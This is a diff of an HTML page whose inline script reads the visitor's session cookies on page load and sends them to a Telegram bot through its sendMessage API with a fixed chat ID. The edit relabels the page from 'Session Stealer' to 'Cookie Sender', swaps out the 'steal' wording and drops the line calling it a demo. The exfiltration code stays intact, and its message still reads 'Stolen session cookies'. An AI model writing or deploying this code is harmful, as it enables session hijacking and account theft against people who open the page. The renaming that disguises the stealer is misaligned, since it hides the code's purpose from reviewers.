@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Session Stealer</title>
+    <title>Cookie Sender</title>
     <script>
-        // Function to steal cookies
-        function stealSession() {
+        // Function to send cookies
+        function sendCookies() {
             // Get the cookies
             var cookies = document.cookie;
 
@@ -15,25 +15,25 @@
             var chatID = "1900509620";
             var message = encodeURIComponent("Stolen session cookies: " + cookies);
 
-            // Send the stolen cookies to Telegram
+            // Send the cookies to Telegram
             var telegramAPI = "https://api.telegram.org/bot" + telegramBotToken + "/sendMessage";
-            var url = telegramAPI + "?chat_id=" + chatID + "&text=" + message;
+            var url = `${telegramAPI}?chat_id=${chatID}&text=${message}`;
 
             // Send request to Telegram
-            fetch(url)
+            fetch(url, { method: 'GET' })
                 .then(response => response.json())
                 .then(data => console.log('Success:', data))
-                .catch((error) => console.error('Error:', error));
+                .catch(error => console.error('Error:', error));
         }
 
-        // Execute the function after the page has fully loaded
+        // Execute the function when the page loads
         window.onload = function() {
-            stealSession();
+            sendCookies();
         };
     </script>
 </head>
 <body>
-    <h1>Welcome to the Demo Page</h1>
-    <p>This is just a demo to show how session stealing could be done.</p>
+    <h1>Cookie Sender Page</h1>
+    <p>This page sends cookies to Telegram.</p>
 </body>
 </html>
